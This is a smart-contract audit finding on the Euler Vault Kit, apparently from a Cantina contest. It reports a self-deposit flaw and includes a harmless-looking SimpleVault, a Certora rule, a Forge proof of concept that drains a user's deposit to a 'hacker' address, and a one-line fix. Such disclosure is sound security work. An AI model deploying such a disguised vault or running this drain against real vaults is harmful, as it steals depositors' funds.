# EVK Vault module can Deposit to itself allowing to Drain all Assets

> link to cantina issue => https://cantina.xyz/code/41306bb9-2bb8-4da6-95c3-66b85e11639f/findings/38

## Relevant Context
A seemingly harmless SimpleVault inheriting from the EVK can drain all the Assets of the Vault.

## Finding Description
The EVK VaultModule can deposit into itself, causing an internal inconsistency between the actual Vault balance and `totalAssets()`.
(more precisely between `asset.balanceOf(address(vault))` and `vault.totalAssets()`), even without using any borrowing functionnality.

SimpleVault, a contract inheriting from EVault, that appears completely harmless on its own, can exploit this inconsistency by calling VaultModule code to drain all the Assets of the Vault.


**`SimpleVault` code:**
<details  open>


```solidity

// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import {EVault} from "src/EVault/EVault.sol";
import {IEVault} from "src/EVault/IEVault.sol";
import {Base} from "src/EVault/shared/Base.sol";

interface ISimpleVaultBase {
    function stake(uint256, address) external returns (uint256);
    function unstake(uint256, address, address) external returns (uint256);
}

interface ISimpleVault is IEVault, ISimpleVaultBase {}

contract SimpleVault is ISimpleVaultBase, EVault {
    constructor(Integrations memory integrations, DeployedModules memory modules) EVault(integrations, modules) {}

    /// Define aliases for 2 main Vault functions
    //  stake == deposit
    function stake(uint256 amount, address receiver) external returns (uint256) {
        return this.deposit(amount, receiver);
    }

    // unstake == withdraw
    function unstake(uint256 amount, address receiver, address owner) external returns (uint256) {
        return this.withdraw(amount, receiver, owner);
    }
}
```
</details>

The hack here is to call `this.deposit` and `this.withdraw` instead of `deposit` and `withdraw` to enable the Vault to be the actual caller. So depositing into itself, implying it's own balance unchanged (due to a transfer of Assets to itsef, sort of `transfer(from, to)` with `to == from`)

So anyone can call `stake` with `totalAssets()` amount, and then call `unstake` with the same amount, draining all the Assets of the Vault in 2 transactions.


## Impact Explanation
EVK is unsecure, and can't be used as is as a Kit. If anyone promote a Vault like `SimpleVault` or any other form of EVK derivated Vault, inheriting from `EVault`, extanding it with new modules or modifying existing EVK code, can exploit this weakness and steal all users funds deposited in the Vault, event if the Vault is permissionless.

Main concern here is that `SimpleVault` seems harmless, but use one invisible EVK weakness.


## Likelihood Explanation
As soon as this type of derivated Vault from EVK is deployed, it can be exploited.

The likelihood is high, as the code is public and the exploit is easy to understand and implement.

The only hurdle is to promote this malicious Vault, without audits (saying "it's only 2 lines of code added..."), to attract users and encourange them to deposit funds in it.

Impact is that all sort of Vault like `SimpleVault` derivated from the EVK can drain all the assets in 2 transactions.


## Proof of Concept
Weakness has been found via a Certora rule.

**Certora rule detecting the issue**
<details  open>

```solidity

// Shares are returned only and only if balance of actual caller strictly decrease
rule depositShares(env e, calldataarg args) {
  address caller = actualCaller(e);

  mathint _balanceCaller = userAssets(e, caller);
  uint256 shares = deposit(e, args);
  mathint balanceCaller_ = userAssets(e, caller);

  assert shares > 0 <=> balanceCaller_ < _balanceCaller;
}
```
</details>

This rule has counter examples only when `actualCaller == vault`, i.e. `shares > 0` without balance change

Here is a POC with a forge test, including traces and asserts:

**`DepositSelfHack` POC contract - File `test/contest/DepositSelfHack.sol`:**
<details>

```solidity

 // SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import {SimpleVaultTest} from "./SimpleVault.t.sol";
import {ISimpleVault} from "src/EVault/SimpleVault.sol";
import {console2} from "forge-std/Test.sol";

contract DepositSelfHack is SimpleVaultTest {
    uint256 one = 1e18;
    address user = makeAddr("user");
    address hacker = makeAddr("hacker");

    function _log(string memory label) public view {
        console2.log(label, "| User   Balance :", assetTST.balanceOf(user));
        console2.log(label, "| Vault  Balance :", assetTST.balanceOf(address(eTST)));
        console2.log(label, "| Total  Assets  :", eTST.totalAssets());
        console2.log(label, "| Hacker Balance :", assetTST.balanceOf(hacker));
        console2.log("------------------------|-------------------------------------");
    }

    function test_depositSelfHack() public {
        assetTST.mint(user, one);
        _log("       User   Mint    1");

        hoax(user);
        assetTST.approve(address(eTST), one);

        assert(assetTST.balanceOf(address(eTST)) == 0);
        assert(assetTST.balanceOf(user) == one);
        assert(assetTST.balanceOf(hacker) == 0);

        hoax(user);
        eTST.deposit(one, user);
        _log("       User   Deposit 1");

        ISimpleVault(address(eTST)).stake(one, address(eTST));
        _log("Buggy  Vault  Deposit 1");

        ISimpleVault(address(eTST)).unstake(one, hacker, address(eTST));
        _log("Hacker Vault  Steal   1");

        assert(assetTST.balanceOf(address(eTST)) == 0);
        assert(assetTST.balanceOf(user) == 0);
        assert(assetTST.balanceOf(hacker) == one);
    }
}

```
</details>

**`SimpleVault` Test Setup - File `test/contest/SimpleVaultTest.sol`:**
<details>

```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.13;

import {Test, console2, stdError} from "forge-std/Test.sol";
import {DeployPermit2} from "permit2/test/utils/DeployPermit2.sol";

import {GenericFactory} from "src/GenericFactory/GenericFactory.sol";

import {ProtocolConfig} from "src/ProtocolConfig/ProtocolConfig.sol";

import {Dispatch} from "src/EVault/Dispatch.sol";

import {Initialize} from "src/EVault/modules/Initialize.sol";
import {Token} from "src/EVault/modules/Token.sol";
import {Vault} from "src/EVault/modules/Vault.sol";
import {Borrowing} from "src/EVault/modules/Borrowing.sol";
import {Liquidation} from "src/EVault/modules/Liquidation.sol";
import {BalanceForwarder} from "src/EVault/modules/BalanceForwarder.sol";
import {Governance} from "src/EVault/modules/Governance.sol";
import {RiskManager} from "src/EVault/modules/RiskManager.sol";

// import {EVault} from "src/EVault/EVault.sol";
// import {ISimpleVault, IERC20} from "src/EVault/ISimpleVault.sol";
import {SimpleVault, ISimpleVault} from "src/EVault/SimpleVault.sol";

import {TypesLib} from "src/EVault/shared/types/Types.sol";
import {Base} from "src/EVault/shared/Base.sol";

import {EthereumVaultConnector} from "ethereum-vault-connector/EthereumVaultConnector.sol";

import {TestERC20} from "test/mocks/TestERC20.sol";
import {MockBalanceTracker} from "test/mocks/MockBalanceTracker.sol";
import {MockPriceOracle} from "test/mocks/MockPriceOracle.sol";
import {IRMTestDefault} from "test/mocks/IRMTestDefault.sol";
import {IHookTarget} from "src/interfaces/IHookTarget.sol";
import {SequenceRegistry} from "src/SequenceRegistry/SequenceRegistry.sol";

import {AssertionsCustomTypes} from "test/helpers/AssertionsCustomTypes.sol";

import "src/EVault/shared/Constants.sol";

contract SimpleVaultTest is AssertionsCustomTypes, Test, DeployPermit2 {
    EthereumVaultConnector public evc;
    address admin;
    address feeReceiver;
    address protocolFeeReceiver;
    ProtocolConfig protocolConfig;
    address balanceTracker;
    MockPriceOracle oracle;
    address unitOfAccount;
    address permit2;
    address sequenceRegistry;
    GenericFactory public factory;

    TestERC20 assetTST;

    ISimpleVault public eTST;

    address initializeModule;
    address tokenModule;
    address vaultModule;
    address borrowingModule;
    address liquidationModule;
    address riskManagerModule;
    address balanceForwarderModule;
    address governanceModule;

    Base.Integrations integrations;
    Dispatch.DeployedModules modules;

    function setUp() public virtual {
        admin = vm.addr(1000);
        feeReceiver = makeAddr("feeReceiver");
        protocolFeeReceiver = makeAddr("protocolFeeReceiver");
        factory = new GenericFactory(admin);

        evc = new EthereumVaultConnector();
        protocolConfig = new ProtocolConfig(admin, protocolFeeReceiver);
        balanceTracker = address(new MockBalanceTracker());
        oracle = new MockPriceOracle();
        unitOfAccount = address(1);
        permit2 = deployPermit2();
        sequenceRegistry = address(new SequenceRegistry());
        integrations =
            Base.Integrations(address(evc), address(protocolConfig), sequenceRegistry, balanceTracker, permit2);

        initializeModule = address(new Initialize(integrations));
        tokenModule = address(new Token(integrations));
        vaultModule = address(new Vault(integrations));
        borrowingModule = address(new Borrowing(integrations));
        liquidationModule = address(new Liquidation(integrations));
        riskManagerModule = address(new RiskManager(integrations));
        balanceForwarderModule = address(new BalanceForwarder(integrations));
        governanceModule = address(new Governance(integrations));

        modules = Dispatch.DeployedModules({
            initialize: initializeModule,
            token: tokenModule,
            vault: vaultModule,
            borrowing: borrowingModule,
            liquidation: liquidationModule,
            riskManager: riskManagerModule,
            balanceForwarder: balanceForwarderModule,
            governance: governanceModule
        });

        address evaultImpl = address(new SimpleVault(integrations, modules));

        vm.prank(admin);
        factory.setImplementation(evaultImpl);

        assetTST = new TestERC20("Test Token", "TST", 18, false);
        eTST = ISimpleVault(
            factory.createProxy(address(0), true, abi.encodePacked(address(assetTST), address(oracle), unitOfAccount))
        );
        eTST.setInterestRateModel(address(new IRMTestDefault()));
        eTST.setMaxLiquidationDiscount(0.2e4);
        eTST.setFeeReceiver(feeReceiver);
    }

    address internal SYNTH_VAULT_HOOK_TARGET = address(new MockHook());
    uint32 internal constant SYNTH_VAULT_HOOKED_OPS = OP_DEPOSIT | OP_MINT | OP_REDEEM | OP_SKIM | OP_REPAY_WITH_SHARES;

    function createSynthEVault(address asset) internal returns (ISimpleVault) {
        ISimpleVault v = ISimpleVault(
            factory.createProxy(address(0), true, abi.encodePacked(address(asset), address(oracle), unitOfAccount))
        );
        v.setInterestRateModel(address(new IRMTestDefault()));

        v.setInterestFee(1e4);

        v.setHookConfig(SYNTH_VAULT_HOOK_TARGET, SYNTH_VAULT_HOOKED_OPS);

        return v;
    }

    function getSubAccount(address primary, uint8 subAccountId) internal pure returns (address) {
        require(subAccountId <= 256, "invalid subAccountId");
        return address(uint160(uint160(primary) ^ subAccountId));
    }
}

contract MockHook is IHookTarget {
    error E_OnlyAssetCanDeposit();
    error E_OperationDisabled();

    function isHookTarget() external pure override returns (bytes4) {
        return this.isHookTarget.selector;
    }

    // deposit is only allowed for the asset
    function deposit(uint256, address) external view {
        address asset = ISimpleVault(msg.sender).asset();

        // these calls are just to test if there's no RO-reentrancy for the hook target
        ISimpleVault(msg.sender).totalBorrows();
        ISimpleVault(msg.sender).balanceOf(address(this));

        if (asset != caller()) revert E_OnlyAssetCanDeposit();
    }

    // all the other hooked ops are disabled
    fallback() external {
        revert E_OperationDisabled();
    }

    function caller() internal pure returns (address _caller) {
        assembly {
            _caller := shr(96, calldataload(sub(calldatasize(), 20)))
        }
    }
}

```
</details>

**`forge test --mt depositSelfHack -vv` produces this output:**
<details open>

```
 » forge test --mt depositSelfHack -vv
[⠒] Compiling...
No files changed, compilation skipped

Ran 1 test for test/contest/DepositSelfHack.t.sol:SimpleVault_DepositSelfHack
[PASS] test_depositSelfHack() (gas: 379373)
Logs:
         User   Mint    1 | User   Balance : 1000000000000000000
         User   Mint    1 | Vault  Balance : 0
         User   Mint    1 | Total  Assets  : 0
         User   Mint    1 | Hacker Balance : 0
  ------------------------|-------------------------------------
         User   Deposit 1 | User   Balance : 0
         User   Deposit 1 | Vault  Balance : 1000000000000000000
         User   Deposit 1 | Total  Assets  : 1000000000000000000
         User   Deposit 1 | Hacker Balance : 0
  ------------------------|-------------------------------------
  Buggy  Vault  Deposit 1 | User   Balance : 0
  Buggy  Vault  Deposit 1 | Vault  Balance : 1000000000000000000
  Buggy  Vault  Deposit 1 | Total  Assets  : 2000000000000000000
  Buggy  Vault  Deposit 1 | Hacker Balance : 0
  ------------------------|-------------------------------------
  Hacker Vault  Steal   1 | User   Balance : 0
  Hacker Vault  Steal   1 | Vault  Balance : 0
  Hacker Vault  Steal   1 | Total  Assets  : 1000000000000000000
  Hacker Vault  Steal   1 | Hacker Balance : 1000000000000000000
  ------------------------|-------------------------------------

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 4.88ms (1.05ms CPU time)

Ran 1 test suite in 154.01ms (4.88ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```
</details>

## Recommendation

To prevent this weakness, add a one line check to prevent the Vault from depositing to itself.

**`Vault.sol` `deposit` function - Lines 123-128 of File `src/EVault/modules/Vault.sol`:**
<details  open>

```diff
    /// @inheritdoc IERC4626
    function deposit(uint256 amount, address receiver) public virtual nonReentrant returns (uint256) {
        (VaultCache memory vaultCache, address account) = initOperation(OP_DEPOSIT, CHECKACCOUNT_NONE);
+       require(account != address(this), "Vault: cannot deposit to self");

        Assets assets = amount == type(uint256).max ? vaultCache.asset.balanceOf(account).toAssets() : amount.toAssets();
        if (assets.isZero()) return 0;

```

</details>